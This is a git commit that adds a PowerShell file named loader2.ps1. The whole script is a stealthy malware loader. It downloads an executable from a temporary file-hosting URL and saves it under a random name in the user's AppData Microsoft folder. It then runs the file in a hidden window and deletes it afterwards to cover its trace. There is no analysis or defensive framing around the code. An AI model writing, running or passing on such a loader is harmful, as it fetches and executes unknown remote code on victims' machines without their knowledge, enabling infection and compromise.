07c6cd6cfbd790e01bbe1a56a67e40ceb8e7adf5
xxuavails <hfigo6441@gmail.com>
2025-09-19 20:02:40 +0300

    Add files via upload

---
+++ loader2.ps1
@@ -0,0 +1,14 @@
+$exeUrl = "http://tmpfiles.org/dl/1222307/mes.exe"
+$tmpPath = "$env:USERPROFILE\AppData\Local\Microsoft\$(New-Guid).exe"
+
+try {
+    $wc = New-Object System.Net.WebClient
+    $wc.DownloadFile($exeUrl, $tmpPath)
+
+    $p = Start-Process -FilePath $tmpPath -WindowStyle Hidden -PassThru
+    $p.WaitForExit()
+
+    Remove-Item $tmpPath -Force -ErrorAction SilentlyContinue
+} catch {
+    Write-Error "Execution failed: $_"
+}
